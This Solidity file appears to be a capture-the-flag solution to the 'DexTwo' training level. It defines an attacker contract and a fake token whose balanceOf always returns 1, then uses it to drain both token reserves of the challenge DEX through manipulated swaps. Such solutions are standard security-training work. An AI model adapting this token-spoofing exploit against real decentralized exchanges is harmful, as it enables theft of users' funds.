// SPDX-License-Identifier: MIT
import "../../src/DexTwo/DexTwo.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;
contract DexTwoExploit {

    DexTwo public victim;
    MaliciousFungibleToken public myToken;

    constructor(address payable _victim){
        victim = DexTwo(_victim);
        myToken = new MaliciousFungibleToken(address(victim), "malicious", "M1", 2);
    }

    function hack() public {
        // Approve DexTwo to spend our tokens
        myToken.approve(address(victim), type(uint256).max);

        // Transfer 1 of our token to DexTwo
        myToken.transfer(address(victim), 1);

        // Swap our token for token1
        victim.swap(address(myToken), victim.token1(), 1);

        // Swap our token for token2
        victim.swap(address(myToken), victim.token2(), 1);
    }

    receive() external payable {
    }
}



contract MaliciousFungibleToken is SwappableTokenTwo {

    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) SwappableTokenTwo(dexInstance, name, symbol, initialSupply) {
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return 1;
    }
}